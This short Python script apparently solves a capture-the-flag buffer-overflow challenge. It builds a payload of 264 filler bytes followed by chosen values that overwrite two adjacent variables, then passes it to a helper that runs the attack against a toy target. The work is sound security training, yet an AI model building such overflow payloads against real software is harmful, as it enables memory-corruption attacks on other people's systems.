from templates import buff_overflow


def main():
    # buffer is 256B, there's 8B between buffer and overwrite_me_too, and 0B between overwrite_me_too and overwrite_me
    payload = (b"a" * (0x100 + 8)) + b"\x37\x13\x00\x00" + (b"a" * 0) + b"\x69\x69\x69\x69"
    fail_str = "But you are not a Jedi yet!"

    buff_overflow(payload, fail_str)


main()
